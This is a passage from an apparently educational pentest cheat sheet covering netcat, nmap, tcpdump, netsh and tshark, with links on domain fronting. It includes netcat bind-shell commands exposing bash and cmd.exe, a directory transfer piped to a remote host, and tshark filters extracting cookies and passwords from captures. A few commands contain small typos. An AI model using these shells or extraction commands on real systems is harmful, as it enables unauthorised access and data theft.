<li>Script engine: <code class="codehilite"><span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">nmap</span><span class="o">/</span><span class="n">scripts</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">smb</span></code></li>
<li>Important flags<ul>
<li><code class="codehilite"><span class="o">-</span><span class="n">O</span></code> for OS Fingerprinting</li>
<li><code class="codehilite"><span class="o">-</span><span class="n">sV</span></code> for banner grabbing</li>
</ul>
</li>
<li>Netstat<ul>
<li>Kernel IP routing table: <code class="codehilite"><span class="n">netstat</span> <span class="o">-</span><span class="n">nr</span></code></li>
<li>Listening ports: <code class="codehilite"><span class="n">netstat</span> <span class="o">-</span><span class="n">lp</span></code> <code class="codehilite"><span class="n">netstat</span> <span class="o">-</span><span class="n">lvnp</span></code></li>
</ul>
</li>
<li>Netcat <ul>
<li>Cheat sheet: <a href="https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf">https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf</a></li>
<li>General Commands <ul>
<li>Listen on port 567/TCP: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="o">-</span><span class="n">p</span> <span class="mi">567</span></code> </li>
<li>Connecting to 567 of 1.2.3.4: <code class="codehilite"><span class="n">nc</span> <span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">4</span> <span class="mi">5676</span></code> </li>
<li>Pipe a text file to the listener: <code class="codehilite"><span class="n">cat</span> <span class="n">infile</span> <span class="o">|</span> <span class="n">nc</span> <span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">4</span> <span class="mi">567</span> <span class="o">-</span><span class="n">q</span> <span class="mi">10</span></code></li>
<li>Have the listener save a received text file: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="o">-</span><span class="n">p</span> <span class="mi">567</span> <span class="o">&gt;</span> <span class="n">textfile</span></code></li>
<li>Transfer a directory: <ul>
<li>Reciever: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="o">-</span><span class="n">p</span> <span class="mi">678</span> <span class="o">|</span> <span class="n">tar</span> <span class="n">xvfpz</span></code></li>
<li>Sender: <code class="codehilite"><span class="n">tar</span> <span class="n">zcfp</span> <span class="o">-</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="k">to</span><span class="o">/</span><span class="n">directory</span> <span class="o">|</span> <span class="n">nc</span> <span class="o">-</span><span class="n">w</span> <span class="mi">3</span> <span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">4</span> <span class="mi">678</span></code> </li>
</ul>
</li>
<li>Send a message to your syslog server (the &lt;0&gt; means emerg): <code class="codehilite"><span class="n">echo</span> <span class="s1">&#39;&lt;0&gt;message&#39;</span> <span class="o">|</span> <span class="n">nc</span> <span class="o">-</span><span class="n">w</span> <span class="mi">1</span> <span class="o">-</span><span class="n">u</span> <span class="n">syslogger</span> <span class="mi">514</span></code> </li>
<li>Setup a remote shell listener: <ul>
<li><code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;/bin/bash&#39;</span> <span class="o">-</span><span class="n">l</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1234</span> <span class="o">-</span><span class="n">t</span></code></li>
<li><code class="codehilite"><span class="n">nc</span> <span class="n">l</span> <span class="n">p</span> <span class="mi">1234</span> <span class="n">e</span> <span class="ss">&quot;c:\windows\system32\cmd.exe&quot;</span></code> </li>
</ul>
</li>
<li>Make an HTTP request: <code class="codehilite"><span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="ss">&quot;GET http://www.google.com HTTP/1.0nn&quot;</span> <span class="o">|</span> <span class="n">nc</span> <span class="o">-</span><span class="n">w</span> <span class="mi">5</span> <span class="n">www</span><span class="p">.</span><span class="n">google</span><span class="p">.</span><span class="n">com</span> <span class="mi">80</span></code> </li>
<li>One-page webserver: <code class="codehilite"><span class="n">cat</span> <span class="n">homepage</span><span class="p">.</span><span class="n">txt</span> <span class="o">|</span> <span class="n">nc</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">l</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span></code> </li>
</ul>
</li>
<li>General Options <ul>
<li>Use IPv4 addressing only: <code class="codehilite"><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="mi">4</span><span class="w"> </span><span class="o">[</span><span class="n">options</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">host</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">port</span><span class="o">]</span><span class="w"></span></code> </li>
<li>Use IPv6 addressing only: <code class="codehilite"><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="mi">6</span><span class="w"> </span><span class="o">[</span><span class="n">options</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">host</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">port</span><span class="o">]</span><span class="w"></span></code> </li>
<li>UDP instead of TCP: <code class="codehilite"><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="o">[</span><span class="n">options</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">host</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">port</span><span class="o">]</span><span class="w"></span></code> </li>
<li>Listen for an incoming connection: <code class="codehilite"><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">[</span><span class="n">host</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">port</span><span class="o">]</span><span class="w"></span></code> </li>
<li>Continue listening after client has disconnected: <code class="codehilite"><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">[</span><span class="n">host</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">port</span><span class="o">]</span><span class="w"></span></code> </li>
<li>No DNS lookups: <code class="codehilite"><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="o">[</span><span class="n">host</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">port</span><span class="o">]</span><span class="w"></span></code> </li>
<li>Use specific source port: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">p</span> <span class="p">[</span><span class="n">source</span> <span class="n">port</span><span class="p">]</span> <span class="p">[</span><span class="n">host</span><span class="p">]</span> <span class="p">[</span><span class="n">port</span><span class="p">]</span></code> </li>
<li>Use source IP: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">s</span> <span class="p">[</span><span class="n">source</span> <span class="n">ip</span><span class="p">]</span> <span class="p">[</span><span class="n">host</span><span class="p">]</span> <span class="p">[</span><span class="n">port</span><span class="p">]</span></code> </li>
<li>Apply 'n' second timeout: <code class="codehilite"><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">[</span><span class="n">timeout</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">host</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">port</span><span class="o">]</span><span class="w"></span></code> </li>
<li>Verbose output: <code class="codehilite"><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">[</span><span class="n">host</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">port</span><span class="o">]</span><span class="w"></span></code> </li>
</ul>
</li>
<li>Port Scanning <ul>
<li>Scan a single TCP port: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">zv</span> <span class="n">hostname</span><span class="p">.</span><span class="n">com</span> <span class="mi">80</span></code> </li>
<li>Scan a range of ports: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">zv</span> <span class="n">hostname</span><span class="p">.</span><span class="n">com</span> <span class="mi">80</span><span class="o">-</span><span class="mi">84</span></code> </li>
<li>Scan multiple ports: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">zv</span> <span class="n">hostname</span><span class="p">.</span><span class="n">com</span> <span class="mi">80</span> <span class="mi">84</span></code> </li>
</ul>
</li>
<li>Other <ul>
<li>One page web server: <code class="codehilite"><span class="k">while</span> : <span class="c1">; do ( echo -ne &quot;HTTP/1.1 200 OK\r\nContent-Length: $(wc -c &lt;index.html)\r\n\r\n&quot; ; cat index.html; ) | nc -l -p 8080 ; done</span></code></li>
<li>Proxy: <code class="codehilite"><span class="n">mknod</span> <span class="n">backpipe</span> <span class="n">p</span> <span class="p">;</span> <span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="p">[</span><span class="n">proxy</span> <span class="n">port</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">backpipe</span> <span class="o">|</span> <span class="n">nc</span> <span class="p">[</span><span class="n">destination</span> <span class="n">host</span><span class="p">]</span> <span class="p">[</span><span class="n">destination</span> <span class="n">port</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">pipe</span></code></li>
<li>Wrap readline history library (support up arrow, etc):<code class="codehilite"><span class="n">rlwrap</span> <span class="n">nc</span> <span class="o">-</span><span class="n">t</span> <span class="n">remotehost</span> <span class="mi">23</span></code></li>
</ul>
</li>
<li>References:<ul>
<li><a href="https://kapeli.com/cheat_sheets/Netcat.docset/Contents/Resources/Documents/index">https://kapeli.com/cheat_sheets/Netcat.docset/Contents/Resources/Documents/index</a></li>
<li><a href="http://workrobot.com/sysadmin/security/netcat_cheatsheet.html">http://workrobot.com/sysadmin/security/netcat_cheatsheet.html</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="techniques">Techniques<a class="headerlink" href="#techniques" title="Permanent link">&para;</a></h2>
<h3 id="domain-fronting">Domain Fronting<a class="headerlink" href="#domain-fronting" title="Permanent link">&para;</a></h3>
<p><strong>Tools</strong></p>
<ul>
<li>Psiphon: <a href="https://www.psiphon3.com/en/index.html">https://www.psiphon3.com/en/index.html</a></li>
<li>Meek: <a href="https://trac.torproject.org/projects/tor/wiki/doc/AChildsGardenOfPluggableTransports#meek">https://trac.torproject.org/projects/tor/wiki/doc/AChildsGardenOfPluggableTransports#meek</a></li>
</ul>
<p><strong>References</strong></p>
<ul>
<li>Introduction: <a href="https://www.andreafortuna.org/cybersecurity/privacy/domain-fronting-in-a-nutshell/">https://www.andreafortuna.org/cybersecurity/privacy/domain-fronting-in-a-nutshell/</a></li>
<li>Usage in APT29: <a href="https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html">https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html</a></li>
<li>Azure (Hardening Your Azure Domain Front): <a href="https://medium.com/@rvrsh3ll/hardening-your-azure-domain-front-7423b5ab4f64">https://medium.com/@rvrsh3ll/hardening-your-azure-domain-front-7423b5ab4f64</a></li>
<li>A 101 on Domain Fronting: <a href="https://digi.ninja/blog/domain_fronting.php">https://digi.ninja/blog/domain_fronting.php</a></li>
<li>Domain Fronting with CloudFront: <a href="https://digi.ninja/blog/cloudfront_example.php">https://digi.ninja/blog/cloudfront_example.php</a></li>
</ul>
<h3 id="traffic-analysis">Traffic Analysis<a class="headerlink" href="#traffic-analysis" title="Permanent link">&para;</a></h3>
<ul>
<li>Accounting Traffic 
    <div class="codehilite"><pre><span></span><span class="ch">#!/bin/bash</span>
<span class="c1"># Reset counters and iptables rules</span>
iptables -Z <span class="o">&amp;&amp;</span> iptables -F
<span class="c1"># Measure incoming traffic from lab machine</span>
iptables -I INPUT <span class="m">1</span> -s <span class="m">192</span>.168.1.23 -j ACCEPT
<span class="c1"># Measure outgoing traffic to lab machine</span>
iptables -I OUTPUT <span class="m">1</span> -d <span class="m">192</span>.168.1.23 -j ACCEPT
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">watch</span> <span class="o">-</span><span class="n">n</span> <span class="mi">1</span> <span class="n">iptables</span> <span class="o">-</span><span class="n">nvL</span>
</pre></div></li>
<li>Using a Capture: <code class="codehilite"><span class="n">aircrack</span><span class="o">-</span><span class="n">ng</span> <span class="n">captured</span><span class="p">.</span><span class="n">cap</span><span class="err">​</span></code></li>
<li>Netcap - A framework for secure and scalable network traffic analysis: <a href="https://github.com/dreadl0ck/netcap">https://github.com/dreadl0ck/netcap</a></li>
<li>PCAP Samples:<ul>
<li>Netresec: <a href="https://www.netresec.com/?page=pcapfiles">https://www.netresec.com/?page=pcapfiles</a></li>
<li>Malware Traffic Analysis: <a href="https://www.malware-traffic-analysis.net/">https://www.malware-traffic-analysis.net/</a></li>
<li>Packettotal (Just like virustotal but for PCAP Analysis): <a href="https://packettotal.com/">https://packettotal.com/</a></li>
<li><a href="https://wiki.wireshark.org/SampleCaptures">https://wiki.wireshark.org/SampleCaptures</a></li>
</ul>
</li>
<li>PA Toolkit (Pentester Academy Wireshark Toolkit) - PA Toolkit is a collection of traffic analysis plugins to extend the functionality of Wireshark from a micro-analysis tool and protocol dissector to the macro analyzer and threat hunter: <a href="https://github.com/pentesteracademy/patoolkit">https://github.com/pentesteracademy/patoolkit</a></li>
<li>CapAnalysis: <a href="https://drive.google.com/uc?authuser=0&amp;id=1Lf8yU7alFZdRlT6WstKjngN2RAp-1jG8&amp;export=download">https://drive.google.com/uc?authuser=0&amp;id=1Lf8yU7alFZdRlT6WstKjngN2RAp-1jG8&amp;export=download</a></li>
<li>Netsh (Windows) <br />
    <div class="codehilite"><pre><span></span><span class="nv">netsh</span> <span class="nv">trace</span> <span class="k">show</span> <span class="nv">capturefilterhelp</span>
<span class="nv">netsh</span> <span class="nv">trace</span> <span class="k">show</span> <span class="nv">scenarios</span>
<span class="nv">netsh</span> <span class="nv">trace</span> <span class="k">show</span> <span class="nv">globalkeywordsandlevel</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="n">netsh</span> <span class="n">trace</span> <span class="k">start</span> <span class="n">capture</span><span class="o">=</span><span class="n">yes</span> <span class="n">IPv4</span><span class="p">.</span><span class="n">Address</span><span class="o">=</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">122</span><span class="p">.</span><span class="mi">2</span>
<span class="n">netsh</span> <span class="n">trace</span> <span class="k">start</span> <span class="n">scenario</span><span class="o">=</span><span class="n">InternetClient</span><span class="p">,</span><span class="n">InternetServer</span><span class="p">,</span><span class="n">NetConnection</span> <span class="n">globalLevel</span><span class="o">=</span><span class="n">win</span><span class="p">:</span><span class="k">Verbose</span> <span class="n">capture</span><span class="o">=</span><span class="n">yes</span> <span class="n">report</span><span class="o">=</span><span class="n">yes</span> <span class="n">traceFile</span><span class="o">=</span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">temp</span><span class="err">\</span><span class="n">trace</span><span class="err">\</span><span class="n">trace001</span><span class="p">.</span><span class="n">etl</span>
<span class="n">netsh</span> <span class="n">trace</span> <span class="n">stop</span>
</pre></div></li>
<li>Use Microsoft Network Monitor 3.4 to view: <a href="https://www.microsoft.com/en-us/download/details.aspx?id=4865">https://www.microsoft.com/en-us/download/details.aspx?id=4865</a></li>
<li>Convert to PAC from: <a href="https://github.com/microsoft/etl2pcapng">https://github.com/microsoft/etl2pcapng</a></li>
<li>Use powershell to convert:
    <div class="codehilite"><pre><span></span><span class="nv">$s</span> <span class="p">=</span> <span class="nb">New-PefTraceSession</span> <span class="n">-Path</span> <span class="err">“</span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">output</span><span class="p">\</span><span class="n">path</span><span class="p">\</span><span class="n">spec</span><span class="p">\</span><span class="n">OutFile</span><span class="p">.</span><span class="n">Cap</span><span class="err">”</span> <span class="n">-SaveOnStop</span>
<span class="nv">$s</span> <span class="p">|</span> <span class="nb">Add-PefMessageProvider</span> <span class="n">-Provider</span> <span class="err">“</span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">input</span><span class="p">\</span><span class="n">path</span><span class="p">\</span><span class="n">spec</span><span class="p">\</span><span class="n">Input</span><span class="p">.</span><span class="n">etl</span><span class="err">”</span>
<span class="nv">$s</span> <span class="p">|</span> <span class="nb">Start-PefTraceSession</span>
</pre></div></li>
<li>tcpdump to show HTTP request/response headers<ul>
<li><a href="https://serverfault.com/questions/504431/human-readable-format-for-http-headers-with-tcpdump">https://serverfault.com/questions/504431/human-readable-format-for-http-headers-with-tcpdump</a>
  <div class="codehilite"><pre><span></span>sudo tcpdump -A -s <span class="m">10240</span> <span class="s1">&#39;tcp port 4080 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)&#39;</span> <span class="p">|</span> egrep --line-buffered <span class="s2">&quot;^........(GET |HTTP\/|POST |HEAD )|^[A-Za-z0-9-]+: &quot;</span> <span class="p">|</span> sed -r <span class="s1">&#39;s/^........(GET |HTTP\/|POST |HEAD )/\n\1/g&#39;</span>
</pre></div>
  <div class="codehilite"><pre><span></span>sudo stdbuf -oL -eL /usr/sbin/tcpdump -A -s <span class="m">10240</span> <span class="s2">&quot;tcp port 4080 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)&quot;</span> <span class="p">|</span> egrep -a --line-buffered <span class="s2">&quot;.+(GET |HTTP\/|POST )|^[A-Za-z0-9-]+: &quot;</span> <span class="p">|</span> perl -nle <span class="s1">&#39;BEGIN{$|=1} { s/.*?(GET |HTTP\/[0-9.]* |POST )/\n$1/g; print }&#39;</span>
</pre></div></li>
</ul>
</li>
<li>tcpdump
    <div class="codehilite"><pre><span></span><span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth1</span>  <span class="o">-</span><span class="n">s</span> <span class="mi">0</span> <span class="n">port</span> <span class="k">not</span> <span class="mi">22</span>
<span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth1</span>  <span class="o">-</span><span class="n">s</span> <span class="mi">0</span> <span class="n">port</span> <span class="k">not</span> <span class="mi">22</span> <span class="k">and</span> <span class="n">port</span> <span class="k">not</span> <span class="mi">53</span>
<span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth1</span> <span class="n">port</span> <span class="k">not</span> <span class="mi">22</span> <span class="k">and</span> <span class="k">host</span> <span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">4</span>
</pre></div></li>
</ul>
<h4 id="tshark">TSHark<a class="headerlink" href="#tshark" title="Permanent link">&para;</a></h4>
<ul>
<li>General<ul>
<li>Supported network interfaces: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">D</span></code></li>
<li>Sniff on eth0: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth0</span></code></li>
<li>Open <code class="codehilite"><span class="n">pcap</span></code>: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span></code></li>
<li>Read 100 packets from <code class="codehilite"><span class="n">pcap</span></code>: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="k">c</span> <span class="mi">100</span></code></li>
<li>Print full details for first 10 Packets: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="k">c</span> <span class="mi">10</span> <span class="o">-</span><span class="n">V</span></code></li>
<li>List of protocols in <code class="codehilite"><span class="n">pcap</span></code>: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">z</span> <span class="n">io</span><span class="p">,</span><span class="n">phs</span> <span class="o">-</span><span class="n">q</span></code></li>
<li>Export into PDML: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span>  <span class="o">-</span><span class="n">T</span> <span class="n">pdml</span> <span class="o">&gt;</span> <span class="n">http</span><span class="p">.</span><span class="n">xml</span></code></li>
<li>PDML to HTML: <code class="codehilite"><span class="n">xsltproc</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">wireshark</span><span class="o">/</span><span class="n">pdml2html</span><span class="p">.</span><span class="n">xsl</span> <span class="n">http</span><span class="p">.</span><span class="n">xml</span> <span class="o">&gt;</span> <span class="n">http</span><span class="p">.</span><span class="n">html</span></code></li>
</ul>
</li>
<li>HTTP<ul>
<li>Only the HTTP traffic: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">Y</span> <span class="s1">&#39;http&#39;</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span></code></li>
<li>IP packets sent from IP address 192.168.252.128 to 52.32.74.91?: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;ip.src==192.168.252.128 &amp;&amp; ip.dst==52.32.74.91&quot;</span></code></li>
<li>Packets containing GET requests: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;http.request.method==GET&quot;</span></code></li>
<li>Print only source IP and URL for all GET request packets: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;http.request.method==GET&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">frame</span><span class="p">.</span><span class="n">time</span> <span class="o">-</span><span class="n">e</span> <span class="n">ip</span><span class="p">.</span><span class="n">src</span> <span class="o">-</span><span class="n">e</span> <span class="n">http</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">full_uri</span></code></li>
<li>Packets contain the "password" string: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="err">&quot;</span><span class="n">http</span> <span class="k">contains</span> <span class="n">password</span><span class="err">”</span></code></li>
<li>Destination IP for GET requests sent to New York Times (<a href="http://www.nytimes.com">www.nytimes.com</a>): <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;http.request.method==GET &amp;&amp; http.host==www.nytimes.com&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">ip</span><span class="p">.</span><span class="n">dst</span></code></li>
<li>Session ID being used by 192.168.252.128 for Amazon India store (amazon.in)?: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;ip contains amazon.in &amp;&amp; ip.src==192.168.252.128&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">ip</span><span class="p">.</span><span class="n">src</span> <span class="o">-</span><span class="n">e</span> <span class="n">http</span><span class="p">.</span><span class="n">cookie</span></code></li>
<li>Type of OS 192.168.252.128 is using: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;ip.src==192.168.252.128 &amp;&amp; http&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">http</span><span class="p">.</span><span class="n">user_agent</span></code></li>
</ul>
</li>
<li>HTTPS<ul>
<li>Only show SSL traffic?: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTPS_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="s1">&#39;ssl&#39;</span></code></li>
<li>Only print the source IP and destination IP for all SSL handshake packets: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTPS_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;ssl.handshake&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">ip</span><span class="p">.</span><span class="n">src</span> <span class="o">-</span><span class="n">e</span> <span class="n">ip</span><span class="p">.</span><span class="n">dst</span></code></li>
<li>List issuer name for all SSL certificates exchanged: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTPS_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;ssl.handshake.certificate&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">x509sat</span><span class="p">.</span><span class="n">printableString</span></code></li>
<li>Print the IP addresses of all servers accessed over SSL: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTPS_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;ssl &amp;&amp; ssl.handshake.type==1&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">ip</span><span class="p">.</span><span class="n">dst</span></code></li>
<li>IP addresses associated with Ask Ubuntu servers (askubuntu.com): <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTPS_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;ip contains askubuntu&quot;</span></code></li>
<li>The IP address of the user who interacted with with Ask Ubuntu servers (askubuntu.com)
<code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTPS_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;ip.dst==151.101.1.69 || ip.dst==151.101.193.69 || ip.dst==151.101.129.69 || ip.dst==151.101.65.69&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">ip</span><span class="p">.</span><span class="n">src</span></code></li>
<li>What DNS servers were used: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTPS_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;dns &amp;&amp; dns.flags.response==0&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">ip</span><span class="p">.</span><span class="n">dst</span></code></li>
<li>Name of the antivirus solution: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">HTTPS_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;ip contains avast&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">ip</span><span class="p">.</span><span class="n">src</span></code></li>
</ul>
</li>
<li>WiFi<ul>
<li>Show only WiFi traffic: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;wlan&quot;</span></code></li>
<li>View the deauthentication packets: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;wlan.fc.type_subtype==0x000c&quot;</span></code></li>
<li>Display WPA handshake packets: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;eapol&quot;</span></code></li>
<li>Print the SSID and BSSID values for all beacon frames: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;wlan.fc.type_subtype==8&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">wlan</span><span class="p">.</span><span class="n">ssid</span> <span class="o">-</span><span class="n">e</span> <span class="n">wlan</span><span class="p">.</span><span class="n">bssid</span></code></li>
